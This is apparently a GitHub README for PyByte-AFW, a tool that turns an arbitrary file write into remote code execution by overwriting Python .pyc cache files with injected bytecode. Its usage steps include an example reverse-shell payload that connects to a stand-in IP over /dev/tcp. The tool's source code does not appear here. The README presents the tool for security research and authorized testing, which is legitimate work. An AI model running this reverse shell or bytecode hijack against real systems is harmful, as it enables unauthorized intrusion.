# PyByte-AFW: Python Bytecode Hijacker ðŸ


## Disclaimer âš ï¸

This project is intended solely for academic, educational, and research purposes in the field of cybersecurity. It is designed for use in:

-   ðŸ§‘â€ðŸŽ“ Learning and training (e.g., university courses, security research, labs)
-   ðŸŽ¯ Controlled environments such as CTFs and legal penetration testing platforms
-   ðŸ” Forensic analysis or security testing only on devices you own or are explicitly authorized to test

The author assumes no responsibility for improper or unlawful use of the software. âŒ Any misuse of this tool for illegal activities, unauthorized access, or violation of privacy is strictly prohibited. Use this tool responsibly and ethically. ðŸ”’


## Project Overview

PyByte-AFW is a specialized security utility designed to demonstrate Remote Code Execution (RCE) via Arbitrary File Write vulnerabilities. The tool specifically targets the way CPython caches compiled code, allowing a researcher to overwrite `.pyc` files with malicious payloads while maintaining the original file's metadata integrity.

For more informations about Python Dirty Arbitrary File Write to RCE, please read: [https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/](https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/)


## Features

-   **Bytecode Manipulation**: Directly interacts with Python's compiled bytecode using the `marshal` module.
-   **Header Preservation**: Automatically extracts and reapplies the 16-byte `.pyc` header (magic number, bit field, timestamp, and size) to ensure the modified file remains valid for the interpreter.
-   **Automatic Version Detection**: Parses the CPython version from cache filenames to streamline the exploitation workflow.
-   **Command Sanitization**: Includes a robust escaping mechanism for shell commands to prevent syntax errors during injection.


## Usage

To use this tool effectively, follow these steps. Ensure you have the necessary permissions on the target filesystem.

1.  **Identification**: Locate a target `.py` script and its corresponding compiled cache file (usually found in the `__pycache__` directory).
2.  **Execution**: Run the script using Python 3:
    
    ```bash
    python3 py_dirty_AFW.py
    ```
    
3.  **Interactive Configuration**:
    -   Provide the **Full Path** to the target script (e.g., `/home/user/app/logic.py`).
    -   Provide the **Full Path** to the `.pyc` file (e.g., `/home/user/app/__pycache__/logic.cpython-310.pyc`).
    -   The script will attempt to detect the CPython version; if it fails, enter it manually (e.g., 311).
4.  **Payload Entry**: Enter the shell command you wish to execute. For example:
    
    ```bash
    bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
    ```
    
5.  **Trigger**: Specify the command used to run the original script. PyByte-AFW will attempt to execute this command to trigger the newly injected bytecode.


## Technologies Used

| Technology    | Description                                        | Link                                                                               |
| :------------ | :------------------------------------------------- | :--------------------------------------------------------------------------------- |
| `Python`      | Primary programming language                       | [python.org](https://www.python.org/) |
| `Marshal`     | Low-level Python object serialization              | [marshal.html](https://docs.python.org/3/library/marshal.html)   |
| `Struct`      | Binary data packing and unpacking                  | [struct.html](https://docs.python.org/3/library/struct.html)     |
| `OS/Sys`      | System interaction and file management             | [os.html](https://docs.python.org/3/library/os.html)             |


## License

Distributed under the MIT License.


## Author

**Matteo Lupinacci**

Connect with me:

-   [LinkedIn](https://www.linkedin.com/in/matteo-lupinacci-00468623b/)
-   [Google Scholar](https://scholar.google.com/citations?hl=it&user=WOSpARYAAAAJ)
-   [ORCID](https://orcid.org/0009-0000-2356-398X)

---

![Python Version](https://img.shields.io/badge/Python-3.8+-blue?style=flat-square)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Readme was generated by Dokugen](https://img.shields.io/badge/Readme%20was%20generated%20by-Dokugen-brightgreen)](https://www.npmjs.com/package/dokugen)
